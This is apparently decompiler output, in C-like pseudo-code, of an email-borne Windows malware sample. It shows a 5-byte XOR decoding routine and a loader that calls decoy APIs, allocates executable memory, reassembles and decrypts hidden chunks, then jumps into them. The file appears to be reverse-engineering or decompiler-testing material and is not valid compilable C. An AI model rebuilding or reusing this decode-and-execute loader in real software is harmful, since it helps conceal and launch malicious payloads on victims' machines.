// subject.c
// Generated on 5/4/2015 1:14:37 AM by decompiling malware_via_email/malware_0503/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn13101000(word32 dwArg04, Eq_75 * dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg14, word32 dwArg18)
{
	*dwArg10 = dwArg0C;
	word16 wLoc0C_21 = (word16) (SEQ(0x00000000, dwArg14) % 0x00000005);
	Eq_14 * dwArg04_26 = dwArg04 + dwArg14;
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		dwArg08->b0000 = (byte) ((int32) dwArg04_26->b0000 ^ (word32) dwArg18[(int32) wLoc0C_21]);
		word16 cx_66 = wLoc0C_21 + 0x0001;
		wLoc0C_21 = cx_66;
		if ((int32) cx_66 == 0x00000005)
			wLoc0C_21 = 0x0000;
		dwArg08 = dwArg08 + 1;
		dwArg04_26 = dwArg04_26 + 1;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return;
}

void fn131010A0(word32 ecx)
{
fn131010A0_entry:
l131010A0:
	branch SafeArraySetRecordInfo(0x00000000, 0x00093474) == 0x80070057 l131010E4
l131010DE:
	Mem28[fp - 0x00000330:word32] = 0x00000000
l131010E4:
	GetACP()
	word32 ecx_45 = Mem0[0x13102000:word32]
	Mem49[fp - 0x00000330:word32] = fp + 0xFFFFFDCC
	Mem51[fp - 0x00000334:word32] = 0x00000000
	fn13101000(fp - 0x00000028, fp - 0x00000028, 0x00000004, fp - 0x00000010, 0x00000000, 0x00093474)
	word32 ecx_65 = Mem51[0x13102004:word32]
	Mem69[fp - 0x00000330:word32] = fp + 0xFFFFFDCC
	Mem71[fp - 0x00000334:word32] = 0x00000004
	fn13101000(fp + 0xFFFFFDA4, fp + 0xFFFFFDA8, 0x00000004, fp - 0x00000010, 0x00000000, 0x00093474)
	word32 ecx_87 = Mem71[0x13102008:word32]
	Mem91[fp - 0x00000330:word32] = fp + 0xFFFFFDCC
	Mem93[fp - 0x00000334:word32] = 0x00000008
	fn13101000(fp - 0x0000001C, fp - 0x00000014, 0x00000004, fp - 0x00000010, 0x00000000, 0x00093474)
	Mem112[fp - 0x00000330:word32] = 0x00000000
	word32 eax_113 = GetModuleHandleA(0x00093474)
	word32 eax_121 = Mem112[0x1310200C:word32]
	Mem125[fp - 0x00000330:word32] = fp + 0xFFFFFDCC
	Mem128[fp - 0x00000334:word32] = 0x0000000C
	fn13101000(fp - 0x00000028, fp - 0x0000001C, 0x00000004, fp - 0x00000010, 0x00000000, 0x00093474)
	word32 dwLoc0248_154 = Mem128[0x13102010:word32]
	Mem157[fp - 0x00000330:word32] = fp + 0xFFFFFDCC
	Mem160[fp - 0x00000334:word32] = 0x00000010
	fn13101000(fp + 0xFFFFFDA8, fp + 0xFFFFFDB8, 0x00000004, fp - 0x00000010, 0x00000000, 0x00093474)
	Mem185[fp - 0x00000330:word32] = 0x00000040
	Mem187[fp - 0x00000334:word32] = 0x00003000
	word32 ecx_182 = ecx_87 * 0x00000008 + 0x0000000C
	word32 dwLoc0250_177 = 0x00000014
	word32 dwLoc24_180 = 0x13102014
	word32 eax_195 = VirtualAlloc(0x00000000, ecx_182 + ecx_65 + ecx_45, 0x00000000, 0x00093474)
	word32 dwLoc0C_201 = eax_121 + eax_113 + ecx_182
	word32 dwLoc0264_205 = ecx_182
	word32 dwLoc08_206 = 0x00000000
	word32 dwLoc18_207 = 0x00000000
l131012E4:
	branch 0x00000001 == 0x00000000 l13101414
l131012F1:
	branch dwLoc0264_205 != dwLoc0248_154 l131013CF
l13101303:
	word32 edx_323 = dwLoc08_206 + 0x00000001
	dwLoc08_206 = edx_323
	branch edx_323 != ecx_87 l13101319
l13101314:
	goto l13101414
l13101319:
	word32 edx_329 = Mem187[dwLoc24_180 + 0x00000000:word32]
	fn13101000(fp - 0x0000001C - dwLoc0250_177, fp - 0x0000001C, 0x00000004, fp - 0x00000010, dwLoc0250_177, fp + 0xFFFFFDCC)
	word32 ecx_358 = dwLoc24_180 + 0x00000004
	word32 eax_355 = dwLoc0250_177 + 0x00000004
	dwLoc0248_154 = Mem187[ecx_358 + 0x00000000:word32]
	fn13101000(fp + 0xFFFFFDB8 - eax_355, fp + 0xFFFFFDB8, 0x00000004, fp - 0x00000010, eax_355, fp + 0xFFFFFDCC)
	dwLoc0250_177 = eax_355 + 0x00000004
	dwLoc24_180 = ecx_358 + 0x00000004
	dwLoc0264_205 = 0x00000000
	dwLoc0C_201 = edx_329 + eax_113
l131013CF:
	Mem308[eax_195 + dwLoc18_207:byte] = Mem187[dwLoc0C_201 + 0x00000000:byte]
	dwLoc0C_201 = dwLoc0C_201 + 0x00000001
	dwLoc18_207 = dwLoc18_207 + 0x00000001
	dwLoc0264_205 = dwLoc0264_205 + 0x00000001
	goto l131012E4
l13101414:
	fn13101000(eax_195 - ecx_182, eax_195, ecx_65, fp + 0xFFFFFDC8, ecx_182, fp + 0xFFFFFDCC)
	call eax_195 + 0x00000F50 (retsize: 4; depth: 840)
	return
fn131010A0_exit:
}

